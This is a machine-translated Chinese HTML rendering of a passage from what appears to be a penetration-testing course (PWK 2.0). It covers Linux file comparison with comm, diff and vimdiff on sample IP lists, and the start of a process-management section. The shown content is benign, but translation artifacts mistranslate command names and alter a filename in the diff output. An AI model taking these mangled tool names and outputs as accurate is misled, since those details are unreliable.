<div style="position:absolute;top:72089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.5 比较文件</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72130;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件比较看似无关紧要，但系统管理员、网络工程师、渗透</font></font></nobr></div>
<div style="position:absolute;top:72150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试人员、IT 支持技术人员和许多其他以技术为导向的专业人员都依赖此技能</font></font></nobr></div>
<div style="position:absolute;top:72169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">很经常。</font></font></nobr></div>
<div style="position:absolute;top:72202;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在本节中，我们将看看一些工具，它们可以帮助简化通常乏味但</font></font></nobr></div>
<div style="position:absolute;top:72221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件比较的奖励过程。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:72256;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.5.1 通讯</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:72294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通讯</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">66</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">比较两个文本文件，显示所特有的每一个线条，如</font></font></nobr></div>
<div style="position:absolute;top:72313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及他们的共同点。</font><font style="vertical-align: inherit;">它输出三个空间偏移列：第​​一个包含</font></font></nobr></div>
<div style="position:absolute;top:72333;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一个文件或参数所独有的行；</font><font style="vertical-align: inherit;">第二个包含唯一的行</font></font></nobr></div>
<div style="position:absolute;top:72352;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第二个文件或参数；</font><font style="vertical-align: inherit;">第三列包含两个文件共享的行。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-n</font></font></font></b></nobr></div>
<div style="position:absolute;top:72371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开关，其中“n”是 1、2 或 3，可用于抑制一列或多列，具体取决于</font></font></nobr></div>
<div style="position:absolute;top:72391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需求。</font><font style="vertical-align: inherit;">我们来看一个例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:72425;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat scan-a.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:72442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:72459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.2</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:72515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">66 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（die.net，2010），https://linux.die.net/man/1/comm</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:72643;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="62"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 62 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:72676;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:73753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:73753;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:73753;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">62</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:72772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.3</font></font></nobr></div>
<div style="position:absolute;top:72788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.4</font></font></nobr></div>
<div style="position:absolute;top:72805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.5</font></font></nobr></div>
<div style="position:absolute;top:72840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat scan-b.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:72856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:72873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.3</font></font></nobr></div>
<div style="position:absolute;top:72890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.4</font></font></nobr></div>
<div style="position:absolute;top:72907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.5</font></font></nobr></div>
<div style="position:absolute;top:72924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.6</font></font></nobr></div>
<div style="position:absolute;top:72958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">comm scan-a.txt scan-b.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:72975;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:72992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.2</font></font></nobr></div>
<div style="position:absolute;top:73009;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.3</font></font></nobr></div>
<div style="position:absolute;top:73026;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.4</font></font></nobr></div>
<div style="position:absolute;top:73043;left:368"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.5</font></font></nobr></div>
<div style="position:absolute;top:73060;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.6</font></font></nobr></div>
<div style="position:absolute;top:73094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">comm -12 scan-a.txt scan-b.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:73111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:73128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.3</font></font></nobr></div>
<div style="position:absolute;top:73145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.4</font></font></nobr></div>
<div style="position:absolute;top:73162;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.5</font></font></nobr></div>
<div style="position:absolute;top:73181;left:341"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 56 - 使用 comm 比较文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在第一个示例中，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">comm</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示了 scan-a.txt 中的唯一行、 scan-b.txt 中的唯一行和</font></font></nobr></div>
<div style="position:absolute;top:73230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别在两个文件中找到的行。</font><font style="vertical-align: inherit;">在第二个例子中，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">comm -12</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只显示行</font></font></nobr></div>
<div style="position:absolute;top:73250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为我们抑制了第一列和第二列，所以在两个文件中都发现了它们。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:73284;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.5.2 差异</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DIFF</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">67</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被用于检测文件之间的差异，类似于通讯命令。</font></font></nobr></div>
<div style="position:absolute;top:73341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是， diff 复杂得多，并且支持多种输出格式。</font><font style="vertical-align: inherit;">最受欢迎的两个</font></font></nobr></div>
<div style="position:absolute;top:73360;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上下文格式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">统一格式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )。</font><font style="vertical-align: inherit;">清单 57 演示了</font></font></nobr></div>
<div style="position:absolute;top:73380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">两种格式的区别：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">diff -c scan-a.txt scan-b.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:73432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*** 扫描-a.txt 2018-02-07 14:46:21.557861848 -0700</font></font></nobr></div>
<div style="position:absolute;top:73449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--- scan-b.txt 2018-02-07 14:46:44.275002421 -0700</font></font></nobr></div>
<div style="position:absolute;top:73466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">***************</font></font></nobr></div>
<div style="position:absolute;top:73483;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*** 1,5 ****</font></font></nobr></div>
<div style="position:absolute;top:73500;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:73517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 192.168.1.2</font></font></nobr></div>
<div style="position:absolute;top:73534;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.3</font></font></nobr></div>
<div style="position:absolute;top:73551;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.4</font></font></nobr></div>
<div style="position:absolute;top:73567;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.5</font></font></nobr></div>
<div style="position:absolute;top:73584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--- 1,5 ----</font></font></nobr></div>
<div style="position:absolute;top:73601;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:73619;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.3</font></font></nobr></div>
<div style="position:absolute;top:73636;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.4</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:73703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">67 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（die.net，2002），https://linux.die.net/man/1/diff</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:73831;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="63"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 63 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:73864;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:74941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:74941;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:74941;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">63</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73960;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.5</font></font></nobr></div>
<div style="position:absolute;top:73976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 192.168.1.6</font></font></nobr></div>
<div style="position:absolute;top:74010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">diff -u scan-a.txt scan-b.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:74028;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--- scan-a.txt 2018-02-07 14:46:21.557861848 -0700</font></font></nobr></div>
<div style="position:absolute;top:74044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+++ 扫描-b.txt 2018-02-07 14:46:44.275002421 -0700</font></font></nobr></div>
<div style="position:absolute;top:74061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">@@ -1,5 +1,5 @@</font></font></nobr></div>
<div style="position:absolute;top:74078;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.1</font></font></nobr></div>
<div style="position:absolute;top:74095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-192.168.1.2</font></font></nobr></div>
<div style="position:absolute;top:74112;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.3</font></font></nobr></div>
<div style="position:absolute;top:74129;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.4</font></font></nobr></div>
<div style="position:absolute;top:74146;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">192.168.1.5</font></font></nobr></div>
<div style="position:absolute;top:74163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+192.168.1.6</font></font></nobr></div>
<div style="position:absolute;top:74182;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 57 - 使用 diff 比较文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出使用“-”指示符来显示该行出现在第一个文件中，但没有出现在第二个文件中。</font></font></nobr></div>
<div style="position:absolute;top:74231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">相反，“+”指示符表示该行出现在第二个文件中，但不在第一个文件中。</font></font></nobr></div>
<div style="position:absolute;top:74264;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些格式最显着的区别是</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">统一格式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不显示线条</font></font></nobr></div>
<div style="position:absolute;top:74283;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件之间匹配，使结果更短。</font><font style="vertical-align: inherit;">两个指标含义相同</font></font></nobr></div>
<div style="position:absolute;top:74303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:74337;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.5.3 vimdiff</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:74376;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vimdiff</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开</font></font></font><font style="vertical-align: inherit;"><font style="font-size:14px"><font style="vertical-align: inherit;">带有多个文件的</font></font><font style="font-size:14px"><font style="vertical-align: inherit;">vim </font></font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">68 </font></font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，每个窗口一个。</font><font style="vertical-align: inherit;">文件之间的区别是</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">突出显示，这使得目视检查它们变得更容易。</font><font style="vertical-align: inherit;">有一些捷径可能是</font></font></nobr></div>
<div style="position:absolute;top:74414;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有用。</font><font style="vertical-align: inherit;">例如：</font></font></nobr></div>
<div style="position:absolute;top:74447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:74447;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">do </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：从另一个窗口获取更改到当前窗口</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:74476;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dp </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 将当前窗口的更改放入另一个窗口</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:74504;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">]c </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 跳转到下一个变化</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:74533;left:145"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[c </font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">: 跳转到上一个更改</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74561;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
</span></font>
<font size="5" face="Times"><span style="font-size:36px;font-family:Times">
<div style="position:absolute;top:74561;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C w </font></font><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：切换到另一个分割窗口。</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们看一个例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74628;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">vimdiff scan-a.txt scan-b.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:74648;left:293"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 58 - 使用 vimdiff（统一格式）比较文件</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:74891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">68 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Vim，2019 年），http://www.vim.org/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:75019;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="64"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 64 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:75052;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:76129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:76129;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:76129;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">64</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:75643;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 7：使用 vimdiff 比较文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在图 7 中，请注意由于彩色高光，很容易发现差异。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:75708;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.5.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 从以下 URL https://offensive-security.com/pwk- 下载存档</font></font></nobr></div>
<div style="position:absolute;top:75757;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件/scans.tar.gz</font></font></nobr></div>
<div style="position:absolute;top:75786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 此存档包含在不同时间扫描同一目标机器的结果。</font></font></nobr></div>
<div style="position:absolute;top:75805;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提取存档并查看是否可以通过比较扫描来发现差异。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:75842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3.6 管理流程</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75884;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux 内核通过使用进程来管理多任务。</font><font style="vertical-align: inherit;">内核维护</font></font></nobr></div>
<div style="position:absolute;top:75903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关每个流程的信息，以帮助使事情井井有条，并且每个流程都被分配了一个</font></font></nobr></div>
<div style="position:absolute;top:75923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编号称为进程 ID (PID)。</font></font></nobr></div>
<div style="position:absolute;top:75955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux shell 还引入了</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作业</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">69</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的概念，</font><font style="vertical-align: inherit;">以简化用户在终端期间的工作流程</font></font></nobr></div>
<div style="position:absolute;top:75975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会议。</font><font style="vertical-align: inherit;">例如，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat error.txt | </font><font style="vertical-align: inherit;">wc -m</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是两个进程的管道，shell</font></font></nobr></div>
<div style="position:absolute;top:75994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑单一工作。</font><font style="vertical-align: inherit;">作业控制是指有选择地暂停作业执行的能力</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:76079;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">69 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Job_control_（Unix）</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:76207;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="65"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 65 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:76240;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:77317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:77317;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:77317;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">65</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
